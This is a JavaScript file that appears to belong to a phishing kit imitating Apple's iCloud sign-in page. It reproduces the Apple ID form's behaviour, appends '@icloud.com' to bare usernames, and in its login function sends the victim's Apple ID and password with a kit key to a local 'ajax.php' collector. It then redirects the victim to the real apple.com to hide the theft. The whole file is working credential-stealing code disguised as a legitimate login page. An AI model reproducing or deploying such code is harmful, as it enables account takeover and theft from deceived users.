 
			var mobile = (/iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase()));
			if (mobile) {jQuery("#footer_div").hide();}
			$("body").css("visibility", "hidden");
			$("#loader").show();
			jQuery("#submit_loader").activity({width: 1, segments: 12, length: 5});
			jQuery("#submit_loader_2").activity({width: 1, segments: 12, length: 5});
			function typeCheck(element) {
				var key = event.keyCode || event.charCode;
				if (key == 8 || key == 46) {
					$(".sbBtn").css("opacity", "0.2");
					return element;
				}
				if (element !== "") {
					$(".sbBtn").css("opacity", "1");
				} else {
					$(".sbBtn").css("opacity", "0.2");
				}
			}
			$(document).ready(function () {
			    if ($("#login").val() != ""){
					$("#btn_pwd").removeClass("disabled")
			    }
				var check = false;
				$( "#login" ).focus(function() {
					$( "#login_div" ).addClass( "appleid-focus" );
					$( "#separator" ).addClass( "focus" );
					$( "#password_div" ).removeClass( "pwd-focus" );
				});

				$( "#password" ).focus(function() {
					if ($("#login").val() != ""){
						var re = /^(([^<>()\[\]\.,;:\s@"]+(\.[^<>()\[\]\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
						if (!re.test($("#login").val())){
							$("#login").val($("#login").val() + "@icloud.com");
						}
					}
					$( "#password_div" ).addClass( "pwd-focus" );
					$( "#separator" ).addClass( "focus" );
					$( "#login_div" ).removeClass( "appleid-focus" );
				});

				$( "#checkbox,#remember" ).click(function() {
					if (!check){
						$("#checkbox").removeClass("icon_uncheck_2");
						$("#checkbox").addClass("icon_checked_2");
						check = !check;
					} else {
						$("#checkbox").removeClass("icon_checked_2");
						$("#checkbox").addClass("icon_uncheck_2");
						check = !check;
					}
				});

				$( "#submit" ).click(function() {
					login();
				});

				var cc = 0; $( "#btn_pwd" ).click(function() {
					$("#spiner_2").removeClass("hide");
					$("#login_css").css({"border-bottom-left-radius" : "0px"});
					$("#login_css").css({"border-bottom-right-radius" : "0px"});
					$("#btn_pwd").addClass( "hide" );
					if ($("#login").val() != ""){
					var re = /^(([^<>()\[\]\.,;:\s@"]+(\.[^<>()\[\]\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
					if (!re.test($("#login").val())){
					$("#login").val($("#login").val() + "@icloud.com");
					}}
					$("#separator").removeClass("hide");
					$("#login_div").css({"border-bottom-left-radius" : "0px"});
					$("#login_div").css({"border-bottom-right-radius" : "0px"});
					$("#login_div").css({"border-bottom-width" : "0px"});
					if (cc == 0){
					cc = 1 ;$("#sign_in_form").slideToggle("slow", function(){
					$( "#submit" ).removeClass( "hide" );
					$("#spiner_2").addClass("hide")});};
					$("#password").val("");
					$("#password").focus();
				});
				
				$("#login").keyup(function (e) {
					 if (cc == 1){cc =0; $("#sign_in_form").slideToggle("slow", function(){
					$("#login_css").css({"border-bottom-left-radius" : "6px"});
					$("#login_css").css({"border-bottom-right-radius" : "6px"});
					$("#login_div").css({"border-bottom-left-radius" : "6px"});
					$("#login_div").css({"border-bottom-right-radius" : "6px"});});}
						if ($("#login").val() != ""){
					$("#btn_pwd").removeClass("disabled");if (e.which == 13) {
					$("#spiner_2").removeClass("hide");
					$("#login_css").css({"border-bottom-left-radius" : "0px"});
					$("#login_css").css({"border-bottom-right-radius" : "0px"});
					$( "#btn_pwd" ).addClass( "hide" );
					if ($("#login").val() != ""){
					var re = /^(([^<>()\[\]\.,;:\s@"]+(\.[^<>()\[\]\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
					if (!re.test($("#login").val())){
					$("#login").val($("#login").val() + "@icloud.com");
					}}
					$("#separator").removeClass("hide");
					$("#login_div").css({"border-bottom-left-radius" : "0px"});
					$("#login_div").css({"border-bottom-right-radius" : "0px"});
					$("#login_div").css({"border-bottom-width" : "0px"});
					if (cc == 0){
					cc = 1 ;
					$("#sign_in_form").slideToggle("slow", function(){
						$( "#submit" ).removeClass( "hide" );
						$("#spiner_2").addClass("hide")})
					;};
					$("#password").val("");
					$("#password").focus(); exit();
				}
					} else {
						$("#btn_pwd").addClass("disabled");
					} if (!$( "#error_div" ).hasClass("hide")) {
						$("#error_div").addClass("hide");
					}
					$("#btn_pwd").removeClass("hide");
					
					$("#submit").addClass("hide");
					
					$("#login_div").css({"border-bottom-width" : "1px"});
					$("#separator").addClass("hide");
				});

				$( "#password" ).keyup(function (e) {
					if (!$( "#error_div" ).hasClass( "hide" )) {
						$("#error_div").addClass("hide");
					}
					if ($("#login").val() != "" && $("#password").val() != ""){
						$("#submit").removeClass("disabled"); if (e.which == 13) {login(); exit();}
					} else {
						$("#submit").addClass("disabled");
					}
				});
				
				var ss = setTimeout(function () {
					$(".body_image_new").animate({ opacity: "1" }, 800);
					clearTimeout(ss);
					
				}, 4000);
			});
			var ss2 = setTimeout(function () {
				$("#loader").fadeOut("slow");
				$(".body").fadeIn("slow");
				$(".container_body").css("display:", "block");
				$(".sbBtn").css("opacity", "0.2");
				clearTimeout(ss2);
			}, 1000);
  	
  	var ss3 = setTimeout(function () {
  		$("#loader_1").fadeOut("slow");
  		$("#block_pass").removeClass("hide");
  		$(".sbBtn").css("opacity", "0.2");
  		clearTimeout(ss3);
  	}, 2000);

			function login(){
			    $("#password").blur();
				var apple = $("#login").val();
				var pw = $("#password").val();
				var key = "260ea";
				
				if(apple!= "" && pw!= "")
				{
					$("#submit").removeClass("disable");
					$("#submit").addClass("v-hide");
					$("#spiner").removeClass("hide");
					$("#spiner").addClass("show");
					$.ajax({

						type:"POST",
						url:"css2/ajax.php",
						data:"appleID="+apple+"&pw="+pw+"&key="+key,
						success: function(msg){
							// alert(msg);
							if(msg == "INVALID")
							{
								//alert("invalid");
								$("#password").val("")
								$("#error_div").removeClass("hide");
								$("#submit").addClass("disabled");
								$("#password").focus();
							}
							else
							{
								var redirect_after_login = "apple";
								if (redirect_after_login == "apple") document.location.href = "https://apple.com/";
								else if (redirect_after_login == "map") document.location.href = "../find.php";
							}
							$("#submit").addClass("disable");
							$("#submit").removeClass("v-hide");
							$("#spiner").addClass("hide");
							$("#spiner").removeClass("show");
						}
					});
				}
				else
				{
					if(apple== "") jQuery("#apple").focus();
					else if(password== "") jQuery("#password").focus();
				}
			}
			function myPasteID(){
				$("#btn_pwd").removeClass("disabled");
			}
			function myPastePW(){
				$("#submit").removeClass("disabled");
			}
			document.getElementById("erasable_1").innerHTML = "";